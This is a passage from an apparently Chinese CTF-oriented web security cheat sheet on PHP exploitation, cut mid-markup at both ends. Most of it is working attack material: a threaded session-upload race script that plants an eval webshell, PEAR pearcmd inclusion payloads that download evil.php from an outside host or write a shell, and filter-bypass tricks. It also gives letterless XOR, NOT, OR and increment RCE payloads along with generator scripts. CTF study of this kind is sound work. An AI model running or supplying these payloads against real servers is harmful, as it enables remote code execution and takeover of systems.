class="string">&#x27;http://6bad481c-1da6-4a89-92f6-db28a56e4f28.chall.ctf.show/index.php&#x27;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		f = io.BytesIO(<span class="string">b&#x27;a&#x27;</span> * <span class="number">1024</span> * <span class="number">50</span>)</span><br><span class="line">		resp = session.post(url, data=&#123;<span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[&quot;cmd&quot;]);?&gt;&#x27;</span>&#125;, files=&#123;<span class="string">&#x27;file&#x27;</span>: (<span class="string">&#x27;q.txt&#x27;</span>,f)&#125;, cookies=&#123;<span class="string">&#x27;PHPSESSID&#x27;</span>: sessid&#125; )</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read</span>(<span class="params">session</span>):</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		resp = session.post(url+<span class="string">&#x27;?file=/tmp/sess_&#x27;</span>+sessid,data=data)</span><br><span class="line">		<span class="keyword">if</span> <span class="string">&#x27;q.txt&#x27;</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">			<span class="built_in">print</span>(resp.text)</span><br><span class="line">			event.clear()</span><br><span class="line">		<span class="keyword">else</span>:</span><br><span class="line">			<span class="comment">#print(&quot;[+++++++++++++]retry&quot;)</span></span><br><span class="line">			<span class="keyword">pass</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	event=threading.Event()</span><br><span class="line">	<span class="keyword">with</span> requests.session() <span class="keyword">as</span> session:</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>): </span><br><span class="line">			threading.Thread(target=write,args=(session,)).start()</span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">30</span>):</span><br><span class="line">			threading.Thread(target=read,args=(session,)).start()</span><br><span class="line">	event.<span class="built_in">set</span>()</span><br></pre></td></tr></table></figure></li></ol><ol><li><p>åˆ©ç”¨<strong>PEAR</strong> ï¼ˆå¼€å¯register_argc_argvï¼‰</p><p>PEARæ˜¯å¯é‡ç”¨çš„PHPç»„ä»¶æ¡†æ¶å’Œç³»ç»Ÿåˆ†å‘ï¼Œä¼šéšPHPå®‰è£…æ—¶è‡ªåŠ¨å®‰è£…ã€‚</p><p><code>?file=pearcmd&amp;+download+http://vps/eval.php</code></p><p><code>?file=/usr/local/lib/php/pearcmd.php&amp;+-c+/tmp/eval.php+-d+man_dir=&lt;?eval($_POST[0]);?&gt;+-s+ HTTP/1.1</code>ï¼ˆBurpsuiteé˜²æµè§ˆå™¨è½¬ç ï¼‰</p><p><code>?file=pearcmd.php&amp;+install+-R+/tmp+http://ip/evil.php</code> ï¼ˆè·¯å¾„ï¼š<code>/tmp/tmp/pear/download/evil.php</code>ï¼‰</p><p>â€‹</p></li></ol><h3 id="die-exit"><a href="#die-exit" class="headerlink" title="die() / exit()"></a>die() / exit()</h3><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/202510">https://www.anquanke.com/post/id/202510</a></p><ul><li><p>è¿‡æ»¤å…³é”®è¯</p><p>urlencode</p></li><li><p>è¿‡æ»¤<code>%25</code></p><p>äºŒæ¬¡ç¼–ç ï¼š<code>a:%6%31 b:%6%32 i:%6%39 q:%7%31 r:%7%32 u:%7%35 U:%5%35</code></p></li><li><p>allow_url_include=Off</p><blockquote><p>file_get_contents å…è®¸ä½¿ç”¨ data URIï¼Œä¼šç›´æ¥è¿”å›åé¢çš„å†…å®¹ï¼Œå¾ˆå¥‡æ€ªçš„æ˜¯ï¼Œåœ¨ allow_url_include=Off çš„æƒ…å†µä¸‹ï¼Œä¸å…è®¸ require_once data URI çš„ï¼Œä½†æ˜¯å¦‚æœ <code>data:,XXX</code> æ˜¯ä¸€ä¸ªç›®å½•åçš„è¯ï¼Œå°±ä¼šæ”¾å¼€é™åˆ¶ã€‚</p></blockquote><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ php -a</span><br><span class="line">Interactive mode enabled</span><br><span class="line"></span><br><span class="line">php &gt; <span class="built_in">echo</span> file_get_contents(<span class="string">&#x27;data:,123456/ricky&#x27;</span>);</span><br><span class="line">123456/ricky</span><br><span class="line">php &gt; <span class="built_in">echo</span> require_once(<span class="string">&#x27;data:,123456/ricky&#x27;</span>);</span><br><span class="line">flag&#123;xxxxxxxxxx&#125;</span><br><span class="line">php &gt;</span><br></pre></td></tr></table></figure></li></ul><h3 id="open"><a href="#open" class="headerlink" title="open()"></a>open()</h3><p>PHPåŸç”Ÿç±»ï¼š<code>ZipArchive::open($filename,$flags)</code></p><p>è°ƒç”¨å¯åˆ é™¤æ–‡ä»¶ï¼š<code>ZipArchive::open(&#39;xxx&#39;,ZipArchive::OVERWRITE)</code>=<code>ZipArchive::open(&#39;xxx&#39;,8)</code></p><p>â€‹</p><h3 id="parse-url"><a href="#parse-url" class="headerlink" title="parse_url()"></a>parse_url()</h3><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.cnblogs.com/tr1ple/p/11137159.html">https://www.cnblogs.com/tr1ple/p/11137159.html</a></p><ol><li><p>//ç»•è¿‡</p><p>æŠŠ//è®¤ä¸ºæ˜¯ç›¸å¯¹è·¯å¾„ï¼ˆPHP&lt;5.4.7ï¼‰ã€‚</p><p>å¦‚æœæ˜¯//ï¼Œåˆ™è¢«è§£ææˆhostï¼Œåé¢çš„å†…å®¹å¦‚æœæœ‰/ï¼Œè¢«è§£æå‡ºpathï¼Œè€Œä¸æ˜¯queryäº†ã€‚</p></li><li><p>///ç»•è¿‡</p><p>ä¸‰ä¸ªæ–œæ å¯¼è‡´ä¸¥é‡ä¸åˆæ ¼çš„URLï¼Œparse_url() è¿”å›FALSEã€‚</p></li></ol><h3 id="basename"><a href="#basename" class="headerlink" title="basename()"></a>basename()</h3><p>è¿”å›è·¯å¾„ä¸­çš„æ–‡ä»¶åéƒ¨åˆ†ï¼Œä¼šå»æ‰æ–‡ä»¶åå¼€å¤´çš„éASCIIå€¼ã€‚</p><p><code>var_dump(basename(&quot;\xffconfig.php&quot;)); =&gt; config.php</code></p><p><code>var_dump(basename(&quot;config.php\xff&quot;)); =&gt; config.php</code></p><p>â€‹</p><h3 id="å‚æ•°ç‰¹æ€§"><a href="#å‚æ•°ç‰¹æ€§" class="headerlink" title="å‚æ•°ç‰¹æ€§"></a>å‚æ•°ç‰¹æ€§</h3><ol><li><p>å‚æ•°ä¸­çš„<code>+</code>ã€<code>[</code>ã€ç©ºæ ¼ã€<code>.</code>å‡ä¼šå˜ä¸º<code>_</code></p></li><li><p>å‚æ•°å½¢å¼<code>A_B.C</code>ï¼šä½¿ç”¨<code>A[B.C</code>ä¼ å…¥</p><p>â€‹</p></li></ol><h3 id="æ— å­—æ¯-æ•°å­—-ç‰¹å®šç¬¦å·RCE"><a href="#æ— å­—æ¯-æ•°å­—-ç‰¹å®šç¬¦å·RCE" class="headerlink" title="æ— å­—æ¯/æ•°å­—/ç‰¹å®šç¬¦å·RCE"></a>æ— å­—æ¯/æ•°å­—/ç‰¹å®šç¬¦å·RCE</h3><ol><li><p>å–åï¼ˆ<code>~</code>ï¼‰</p><p><code>phpinfo()</code> â†’ <code>(~%8F%97%8F%96%91%99%90)()</code></p><p><code>system(&#39;ls&#39;)</code> â†’ <code>(~%8C%86%8C%8B%9A%92)(~%93%8C)</code></p></li><li><p>å¼‚æˆ–ï¼ˆ<code>^</code>ï¼‰</p><p><code>phpinfo()</code> â†’ <code>$_GET[x]&amp;x=phpinfo</code> â†’ <code>${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}()&x=phpinfo</code></p><p><code>system(&#39;ls&#39;)</code> â†’ <code>$_GET[x]($_GET[y])&amp;x=system&amp;y=ls</code> â†’ <code>${%A0%A0%A0%A0^%FF%E7%E5%F4}{x}(${%A0%A0%A0%A0^%FF%E7%E5%F4}{y})&x=system&y=ls</code> `</p><p>æ— å­—æ¯æƒ…å½¢ï¼š</p><p><code>phpinfo()</code> â†’ <code>(&#39;484880800&#39;^&#39;8.8-**)00&#39;^&#39;|~||||~()&#39;)</code></p><p><code>system(&#39;ls&#39;)</code> â†’ <code>(&#39;404008008400&#39;^&#39;9598))08*980&#39;^&#39;~|~|||(*~~*)&#39;)</code></p></li><li><p>æˆ–ï¼ˆ<code>|</code>ï¼‰</p><p>å¯ä»¥ç›´æ¥å°†éœ€è¦æ„é€ çš„å­—ç¬¦ä¸²ä¸åå¼•å·è¿›è¡Œ<strong>å¼‚æˆ–</strong>ï¼Œå¾—åˆ°çš„ç»“æœå†ä¸åå¼•å·ç›¸<strong>æˆ–</strong>å³å¯å¾—åˆ°åŸå­—ç¬¦ä¸²ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;````````&quot;</span>^<span class="string">&quot;readfile&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;````&quot;</span>^<span class="string">&quot;flag&quot;</span>;</span><br></pre></td></tr></table></figure><p>payloadä¾‹ï¼šï¼ˆ<code>readfile(&quot;/flag&quot;)</code>ï¼‰</p><p><code>$code = &quot;(&#39;````````&#39;|&#39; &#39;)(&#39;/````&#39;|&#39;/ &#39;));//&quot;;</code></p><p>å‚è€ƒï¼š</p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/108569080">https://blog.csdn.net/miuzzx/article/details/108569080</a></p><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/miuzzx/article/details/109143413">https://blog.csdn.net/miuzzx/article/details/109143413</a></p><p>æ„é€ ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/* author yu22x */</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$myfile</span> = fopen(<span class="string">&quot;or_rce.txt&quot;</span>, <span class="string">&quot;w&quot;</span>);</span><br><span class="line"><span class="variable">$contents</span>=<span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">256</span>; <span class="variable">$i</span>++) &#123; </span><br><span class="line">	<span class="keyword">for</span> (<span class="variable">$j</span>=<span class="number">0</span>; <span class="variable">$j</span> &lt;<span class="number">256</span> ; <span class="variable">$j</span>++) &#123; </span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$i</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_i</span>=dechex(<span class="variable">$i</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$j</span>&lt;<span class="number">16</span>)&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=<span class="string">&#x27;0&#x27;</span>.dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="variable">$hex_j</span>=dechex(<span class="variable">$j</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="variable">$preg</span> = <span class="string">&#x27;/[0-9a-z]/i&#x27;</span>;<span class="comment">//æ ¹æ®é¢˜ç›®ç»™çš„æ­£åˆ™è¡¨è¾¾å¼ä¿®æ”¹å³å¯</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_i</span>))||preg_match(<span class="variable">$preg</span> , hex2bin(<span class="variable">$hex_j</span>)))&#123;</span><br><span class="line">					<span class="keyword">echo</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  </span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$a</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_i</span>;</span><br><span class="line">		<span class="variable">$b</span>=<span class="string">&#x27;%&#x27;</span>.<span class="variable">$hex_j</span>;</span><br><span class="line">		<span class="variable">$c</span>=(urldecode(<span class="variable">$a</span>)|urldecode(<span class="variable">$b</span>));</span><br><span class="line">		<span class="keyword">if</span> (ord(<span class="variable">$c</span>)&gt;=<span class="number">32</span>&amp;ord(<span class="variable">$c</span>)&lt;=<span class="number">126</span>) &#123;</span><br><span class="line">			<span class="variable">$contents</span>=<span class="variable">$contents</span>.<span class="variable">$c</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$a</span>.<span class="string">&quot; &quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;\n&quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$contents</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># author yu22x</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line"><span class="keyword">from</span> sys <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">action</span>(<span class="params">arg</span>):</span></span><br><span class="line">   s1=<span class="string">&quot;&quot;</span></span><br><span class="line">   s2=<span class="string">&quot;&quot;</span></span><br><span class="line">   <span class="keyword">for</span> i <span class="keyword">in</span> arg:</span><br><span class="line">       f=<span class="built_in">open</span>(<span class="string">&quot;or_rce.txt&quot;</span>,<span class="string">&quot;r&quot;</span>)</span><br><span class="line">       <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">           t=f.readline()</span><br><span class="line">           <span class="keyword">if</span> t==<span class="string">&quot;&quot;</span>:</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">           <span class="keyword">if</span> t[<span class="number">0</span>]==i:</span><br><span class="line">               <span class="comment">#print(i)</span></span><br><span class="line">               s1+=t[<span class="number">2</span>:<span class="number">5</span>]</span><br><span class="line">               s2+=t[<span class="number">6</span>:<span class="number">9</span>]</span><br><span class="line">               <span class="keyword">break</span></span><br><span class="line">       f.close()</span><br><span class="line">   output=<span class="string">&quot;(\&quot;&quot;</span>+s1+<span class="string">&quot;\&quot;|\&quot;&quot;</span>+s2+<span class="string">&quot;\&quot;)&quot;</span> <span class="comment">#åŒå¼•å·å¯æ¢å•å¼•å·</span></span><br><span class="line">   <span class="keyword">return</span>(output)</span><br><span class="line">   </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">   param=action(<span class="built_in">input</span>(<span class="string">&quot;\n[+] your functionï¼š&quot;</span>) )+action(<span class="built_in">input</span>(<span class="string">&quot;[+] your commandï¼š&quot;</span>))+<span class="string">&quot;;&quot;</span></span><br><span class="line">   <span class="built_in">print</span>(param)</span><br></pre></td></tr></table></figure></li><li><p><code>++</code>è¿ç®—è‡ªå¢æ„é€ </p><p>å‚è€ƒï¼š<a target="_blank" rel="noopener" href="https://www.gem-love.com/ctf/2598.html">https://www.gem-love.com/ctf/2598.html</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment">#__author__: é¢–å¥‡L&#x27;Amore www.gem-love.com</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote_plus</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">g</span>(<span class="params">payload, buff</span>):</span></span><br><span class="line">	offset = <span class="number">3</span> + buff</span><br><span class="line">	res = <span class="string">&quot;&quot;</span></span><br><span class="line">	base = <span class="number">65</span></span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(payload)):</span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span> <span class="keyword">or</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		_<span class="built_in">ascii</span> = <span class="built_in">ord</span>(payload[i])</span><br><span class="line">		<span class="comment">#init</span></span><br><span class="line">		underline =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">		undefined = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (<span class="built_in">len</span>(payload) + offset + <span class="number">15</span>))</span><br><span class="line">		var = <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;$__-=<span class="subst">&#123;underline&#125;</span>;$__++;<span class="subst">&#123;underline&#125;</span>/=$__;<span class="subst">&#123;underline&#125;</span>=((<span class="subst">&#123;undefined&#125;</span>/<span class="subst">&#123;undefined&#125;</span>).<span class="subst">&#123;underline&#125;</span>)&quot;</span>+<span class="string">r&quot;&#123;++$__&#125;;$__--;&quot;</span></span><br><span class="line">		res += var;</span><br><span class="line">		tmp = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">if</span> _<span class="built_in">ascii</span> &gt; base:</span><br><span class="line">			<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(_<span class="built_in">ascii</span>-base):</span><br><span class="line">				tmp = tmp + <span class="string">f&quot;++<span class="subst">&#123;underline&#125;</span>;&quot;</span></span><br><span class="line">		res += tmp</span><br><span class="line"></span><br><span class="line">	first =  <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * offset)</span><br><span class="line">	<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(payload)):</span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;_&#x27;</span>:</span><br><span class="line">			res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;_&#x27;;&quot;</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		<span class="keyword">if</span> payload[i] == <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">			res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=&#x27;/&#x27;;&quot;</span></span><br><span class="line">			<span class="keyword">continue</span></span><br><span class="line">		final_var = <span class="string">&quot;$&quot;</span> + (<span class="string">&quot;_&quot;</span> * (i + offset))</span><br><span class="line">		res += <span class="string">f&quot;<span class="subst">&#123;first&#125;</span>.=<span class="subst">&#123;final_var&#125;</span>;&quot;</span></span><br><span class="line">	<span class="keyword">return</span> [res, <span class="string">&quot;$&quot;</span> + <span class="string">&quot;_&quot;</span> * (offset)]</span><br><span class="line"></span><br><span class="line">pre = <span class="string">&quot;&#x27;&#x27;);&quot;</span></span><br><span class="line">after = <span class="string">&#x27;//&#x27;</span></span><br><span class="line"></span><br><span class="line">buff = <span class="built_in">len</span>(<span class="string">&#x27;STRTOLOWERSHOW_SOURCE&#x27;</span>)</span><br><span class="line">flag = g(<span class="string">&quot;/FLAG&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = <span class="built_in">len</span>(<span class="string">&#x27;STRTOLOWER&#x27;</span>)</span><br><span class="line">showsource = g(<span class="string">&quot;SHOW_SOURCE&quot;</span>, buff)</span><br><span class="line"></span><br><span class="line">buff = <span class="number">0</span></span><br><span class="line">strtolower = g(<span class="string">&#x27;STRTOLOWER&#x27;</span>, buff)</span><br><span class="line"></span><br><span class="line">final = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#1.æ„é€ STRTOLOWERå¹¶å­˜è¿›å˜é‡a</span></span><br><span class="line">final += strtolower[<span class="number">0</span>]</span><br><span class="line">a = strtolower[<span class="number">1</span>] <span class="comment"># a = &#x27;$___&#x27; # STRTOLOWER</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#2.æ„é€ SHOW_SOURCEå¹¶å­˜è¿›å˜é‡b</span></span><br><span class="line">final += showsource[<span class="number">0</span>]</span><br><span class="line">b = showsource[<span class="number">1</span>] <span class="comment"># b = &#x27;$_____________&#x27; #SHOW_SOURCE</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#3.æ„é€ /FLAGå¹¶å­˜è¿›å˜é‡c</span></span><br><span class="line">final += flag[<span class="number">0</span>] + flag[<span class="number">1</span>] + <span class="string">&quot;=&#x27;/&#x27;.&quot;</span> + flag[<span class="number">1</span>] + <span class="string">&#x27;;&#x27;</span></span><br><span class="line">c = flag[<span class="number">1</span>] <span class="comment"># c = &#x27;$________________________&#x27; #/FLAG</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#å£°æ˜å¥½abcå˜é‡</span></span><br><span class="line">padding = <span class="string">f&#x27;$______________________________________________=<span class="subst">&#123;a&#125;</span>;$_______________________________________________=<span class="subst">&#123;b&#125;</span>;$________________________________________________=<span class="subst">&#123;c&#125;</span>;&#x27;</span></span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.å˜é‡d = a(c) åˆ™å˜é‡dä¸º/flag</span></span><br><span class="line">d = <span class="string">&quot;$______________________________________________($________________________________________________);&quot;</span></span><br><span class="line">padding = <span class="string">&#x27;$_________________________________________________=&#x27;</span>+d</span><br><span class="line">final += padding</span><br><span class="line"></span><br><span class="line"><span class="comment">#5. b(d) å³ä¸ºSHOW_SOURCE(&#x27;/flag&#x27;)</span></span><br><span class="line">final += <span class="string">&#x27;$_______________________________________________($_________________________________________________);&#x27;</span></span><br><span class="line"></span><br><span class="line">final = pre + final</span><br><span class="line">final = final + after</span><br><span class="line"><span class="built_in">print</span>(final.replace(<span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;%2b&#x27;</span>))</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#å…³é”®å­—æ„é€ </span></span><br><span class="line"><span class="comment">#$_GET[0]($_GET[1]);</span></span><br><span class="line">need = <span class="string">&#x27;GET&#x27;</span></span><br><span class="line"></span><br><span class="line">alpha = <span class="built_in">list</span>(<span class="built_in">set</span>(need))</span><br><span class="line">alpha.sort()</span><br><span class="line"><span class="built_in">print</span>(alpha)</span><br><span class="line">greece = <span class="string">&#x27;Î± Î² Î³ Î´ Îµ Î¶ Î½ Î¾ Î¿ Ï€ Ï Ïƒ Î· Î¸ Î¹ Îº Î» Î¼ Ï„ Ï… Ï† Ï‡ Ïˆ Ï‰ Î“ Î”&#x27;</span>.split(<span class="string">&#x27; &#x27;</span>)</span><br><span class="line"></span><br><span class="line">out = <span class="string">&#x27;$_=C;&#x27;</span></span><br><span class="line">cnt = <span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> alpha:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">		now_php = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">ord</span>(k)-cnt):</span><br><span class="line">			now_php += <span class="string">&#x27;$_++;&#x27;</span></span><br><span class="line">			cnt += <span class="number">1</span></span><br><span class="line">		icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">		now_php += <span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>=$_;&#x27;</span></span><br><span class="line">		out += now_php</span><br><span class="line"></span><br><span class="line">func = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> need:</span><br><span class="line">	<span class="keyword">if</span> <span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>) <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>):</span><br><span class="line">		icon = greece[<span class="built_in">ord</span>(k)-<span class="built_in">ord</span>(<span class="string">&#x27;C&#x27;</span>)]</span><br><span class="line">		func += [<span class="string">f&#x27;$<span class="subst">&#123;icon&#125;</span>&#x27;</span>]</span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		func += [k]</span><br><span class="line">func = <span class="string">&#x27;.&#x27;</span>.join(func)</span><br><span class="line"><span class="built_in">print</span>(func)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">f&#x27;<span 